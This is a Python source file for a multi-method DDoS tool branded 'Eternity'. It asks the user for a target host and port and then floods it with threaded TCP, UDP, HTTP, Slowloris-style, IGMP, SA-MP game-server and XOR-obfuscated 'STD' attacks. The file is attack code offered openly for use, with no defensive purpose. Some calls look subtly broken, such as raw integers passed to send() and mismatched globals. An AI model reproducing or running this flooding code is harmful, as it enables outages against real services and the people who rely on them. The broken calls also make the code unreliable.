# Advanced DDOS TOOLS
# Created by Artemis
# WhatsApp: 081262216840

# Import required modules
import socket
import threading
import random
import time
import os
import sys
import codecs
import ssl
import base64 as b64

# External modules
try:
  from prettytable import PrettyTable
except ImportError:
  print("[!] Error, cannot install module: 'prettytable'")

# Variable
attack_num = 0
err = 0
key = "asdfghjkloiuytresxcvbnmliuytf"

# Table variable
target_table = PrettyTable(["Target", "Port", "Mode"])

# Cookies and useragent
useragents=[""]

ref = [""]

acceptall = [""] 

# Packets variable
packets = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),
codecs.decode("53414d509538e1a9611e63","hex_codec"),
codecs.decode("53414d509538e1a9611e69","hex_codec"),
codecs.decode("53414d509538e1a9611e72","hex_codec"),
codecs.decode("081e62da","hex_codec"),
codecs.decode("081e77da","hex_codec"),
codecs.decode("081e4dda","hex_codec"),
codecs.decode("021efd40","hex_codec"),
codecs.decode("021efd40","hex_codec"),
codecs.decode("081e7eda","hex_codec")
]

# Banner
banner = """
  ______ _                  _ _         
 |  ____| |                (_) |        
 | |__  | |_ ___ _ __ _ __  _| |_ _   _ 
 |  __| | __/ _ \ '__| '_ \| | __| | | | Eternity | Version 2
 | |____| ||  __/ |  | | | | | |_| |_| | (C) Eternity
 |______|\__\___|_|  |_| |_|_|\__|\__, |
                                   __/ |
                                  |___/ 
      Eternity | DDoS attack utilized sockets
-----------------------------------------------------------------
| Eternity | DDoS Tools, with multipurpose functions included.  |
| Discord: Java#0032                                         |
| Github: ./eternity25                                          |
-----------------------------------------------------------------
|                        Methods List                           |
-----------------------------------------------------------------
| || TCP || UDP || HTTP || SAMP || IGMP || STD || SLOW || CC || |
-----------------------------------------------------------------
"""

attack_banner = r"""
          _   _             _    
     /\  | | | |           | |   
    /  \ | |_| |_ __ _  ___| | __
   / /\ \| __| __/ _` |/ __| |/ /
  / ____ \ |_| || (_| | (__|   < Be careful!
 /_/    \_\__|\__\__,_|\___|_|\_\
-----------------------------------
Attack succesfully sended through the system!
"""

# XOR decryption key
def xor_dec(string,key):
	letter = b64.b64decode( string.encode() ).decode()
	lkey = len(key)
	string = []
	num = 0
	for each in letter:
		if num >= lkey:
			num = num % lkey
		string.append(chr(ord(each)^ord(key[num])))
		num += 1
	return "".join(string)

# Main menu functions
def start_url():
  global target, port, threads, multi, mode
  print(banner)
  target = str(input("Target: "))
  port = int(input("Port: "))
  threads = int(input("Threads: "))
  multi = int(input("Packets: "))
  mode = str(input("Mode: "))
  os.system("cls")
  target_table.add_row([target, str(port), mode])
  print(attack_banner)
  print(target_table)
  startloop()

# UDP attack functions
def udp_attack():
    while True:
        for _ in range(multi):
            try:
                global attack_num, err
                message = "GET / HTTP/1.0\r\n"
                message1 = "Host: " + random.choice(['127.0.0.1', '192.168.1.1']) + "\r\n\r\n"
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                pack = random.randint(102000, 999999)
                s.connect((target, port))
                s.send(str.encode(message))
                s.send(str.encode(message1))
                s.sendall(str.encode(message))
                s.sendall(str.encode(message1))
                s.send(pack)
                s.sendall(pack)
                attack_num += 1
                sys.stdout.write("- Attack sended => "+ str(target) +":"+ str(port) +" | Total Sents [" + str(attack_num) + "] | Total Fails [" + str(err) + "]\r")
                sys.stdout.flush()
                s.close()
            except:
                try:
                    s.close()
                    err += 1
                except:
                    pass

# TCP attack functions
def tcp_attack():
    while True:
        for _ in range(multi):
            try:
                global attack_num, err
                message = "GET / HTTP/1.0\r\n"
                message1 = "Host: " + random.choice(['127.0.0.1', '192.168.1.1']) + "\r\n\r\n"
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                pack = random.randint(102000, 999999)
                s.send(str.encode(message))
                s.send(str.encode(message1))
                s.sendall(str.encode(message))
                s.sendall(str.encode(message1))
                s.send(pack)
                s.sendall(pack)
                attack_num += 1
                sys.stdout.write("- Attack sended => "+ str(target) +":"+ str(port) +" | Total Sents [" + str(attack_num) + "] | Total Fails [" + str(err) + "]\r")
                sys.stdout.flush()
                s.close()
            except:
                try:
                    s.close()
                    err += 1
                except:
                    pass
                    
# SA-MP attack functions
def samp_attack():
  global attack_num, error
  while True:
    for _ in range(multi):
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      attack_num += 1
      pack = packets[random.randrange(0,3)]
      sys.stdout.write("- Attack sended => "+ str(target) +":"+ str(port) +" | Total Sents [" + str(attack_num) + "] | Total Fails [" + str(err) + "]\r")
      sys.stdout.flush()
      s.sendto(pack, (target, int(port)))
      if(int(port) == 7777):
        s.sendto(packets[5], (target, int(port)))
      elif(int(port) == 7796):
        s.sendto(packets[4], (target, int(port)))
      elif(int(port) == 7771):
        s.sendto(packets[6], (target, int(port)))
      elif(int(port) == 7784):
        s.sendto(packets[7], (target, int(port)))
      elif(int(port) == 1111):
        s.sendto(packets[9], (target, int(port))) 

# SLOW attack functions
def slow_attack():
  socket_list = []
  global attack_num, err
  get_host = "GET /?" + str(random.randint(0,50000)) + " HTTP/1.1\r\nHost: " + target + "\r\n"
  connection = "Connection: Keep-Alive\r\n"
  useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
  accept = random.choice(acceptall)
  header = get_host + useragent + accept + connection
  for _ in range(int(multi)):
    try:
      attack_num += 1
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((str(target), int(port)))
      sys.stdout.write("- Attack sended => "+ str(target) +":"+ str(port) +" | Total Sents [" + str(attack_num) + "] | Total Fails [" + str(err) + "]\r")
      sys.stdout.flush()
      if int(port) == 443:
        ctx = ssl.SSLContext()
        s = ctx.wrap_socket(s,server_hostname=target)
      s.send(str.encode(header))
      socket_list.append(s)
    except:
      pass
  while True:
    for s in list(socket_list):
      try:
        attack_num += 1
        s.send("X-a: {}\r\n".format(random.randint(1, 50000)).encode("utf-8"))
      except socket.error:
        err += 1
        socket_list.remove(s)
    for _ in range(int(multi)-len(socket_list)):
      try:
        attack_num += 1
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((str(target), int(port)))
        if port == 443:
          s = ssl.wrap_socket(s)
        s.send(str.encode(header))
        socket_list.append(s)
      except:
        err += 1
        pass

# IGMP attack function
def igmp_attack():
  global attack_num, err
  while True:
    try:
      for _ in range(multi):
        punch = random._urandom(20179)
        attack_num += 1
        sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
        sock.sendto(punch, (target, int(port)))
        sys.stdout.write("- Attack sended => "+ str(target) +":"+ str(port) +" | Total Sents [" + str(attack_num) + "] | Total Fails [" + str(err) + "]\r")
        sys.stdout.flush()
        for y in range(threads):
          sock.sendto(punch, (target, int(port)))
    except socket.error:
        sock.close()
        err += 1

# STD attack functions
def std_attack():
  global attack_num, err
  while True:
    sendip = (str(target),int(port))
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    junk_strings = [
      xor_dec('IBwdBwoJSgkDGwcQDVU=', key),
      xor_dec('LBIAA0cKE0siChEAClRURT8dBhkMX19f', key),
      xor_dec('BgEBAxMSSh8DTyglLQNBRU9L', key),
      xor_dec('CQcQFhRSRUQLBh0dDBZcBhwVTDgHFhgWEw8D', key),
      xor_dec('CFMDCRNIAg4AAwhVGxsdERYKEA==', key),
      xor_dec('MicgRgEEBQQITwsUGw1TRFI=', key),
      xor_dec('CRIMB0cKCwUIGAABEVQVClMaEQQQHB8eGwcLBhQTARYUFRoY', key),
      xor_dec('JTcLNUcJHh8NDAJU', key),
      xor_dec('IBwdBwoJSgkDGwcQDVQAChATEFc=', key)
                ]
    try:
      for _ in range(multi):
        attack_num += 1
        sys.stdout.write("- Attack sended => "+ str(target) +":"+ str(port) +" | Total Sents [" + str(attack_num) + "] | Total Fails [" + str(err) + "]\r")
        sys.stdout.flush()
        s.sendto(random.choice(junk_strings).encode(), sendip)
      s.close()
    except:
      s.close()
      err += 1

# CC attack functions
def cc_attack():
  global attack_num, err
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((str(target),int(port)))
      attack_num += 1
      sys.stdout.write("- Attack sended => "+ str(target) +":"+ str(port) +" | Total Sents [" + str(attack_num) + "] | Total Fails [" + str(err) + "]\r")
      sys.stdout.flush()
      if int(port) == 443:
        ctx = ssl.SSLContext()
        s = ctx.wrap_socket(s,server_hostname=target)
      s.send("\000".encode())
      s.close()
    except:
      err += 1
      s.close()

# HTTP attack functions
def http_attack():
  global attack_num, err
  useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
  accept = random.choice(acceptall)
  referer = "Referer: " + random.choice(ref) + target + "\r\n" 
  get_host = 'GET' + " /?=" +str(random.randint(0,20000))+ " HTTP/1.1\r\nHost: " + target +":"+str(port)+ "\r\n"
  connection = "Connection: Keep-Alive\r\n"
  content    = "Content-Type: application/x-www-form-urlencoded\r\n"
  length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
  request  = get_host + useragent + accept + referer + content + length + "\r\n"
  while True:
    for _ in range(multi):
      try:
        attack_num += 1
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        sys.stdout.write("- Attack sended => "+ str(target) +":"+ str(port) +" | Total Sents [" + str(attack_num) + "] | Total Fails [" + str(err) + "]\r")
        sys.stdout.flush()
        s.sendall(str.encode(request))
        s.send(str.encode(request))
        try:
          for i in range(multi):
            s.sendall(str.encode(request))
            s.send(str.encode(request))
        except:
          s.close()
          err += 1
      except:
        s.close()
        err += 1

# Packet looping with multithread
def startloop():
  for i in range(threads):
    if (str.lower(mode) == "tcp"):
      th = threading.Thread(target=tcp_attack)
      th.start()
    if (str.lower(mode) == "udp"):
      th = threading.Thread(target=udp_attack)
      th.start()
    if (str.lower(mode) == "samp"):
      th = threading.Thread(target=samp_attack)
      th.start()
    if (str.lower(mode) == "http"):
      th = threading.Thread(target=http_attack)
      th.start()
    if (str.lower(mode) == "igmp"):
      th = threading.Thread(target=igmp_attack)
      th.start()
    if (str.lower(mode) == "cc"):
      th = threading.Thread(target=cc_attack)
      th.start()
    if (str.lower(mode) == "std"):
      th = threading.Thread(target=std_attack)
      th.start()
    if (str.lower(mode) == "slow"):
      th = threading.Thread(target=slow_attack)
      th.start()
      
# Start the main functions
if __name__ == "__main__":
  start_url()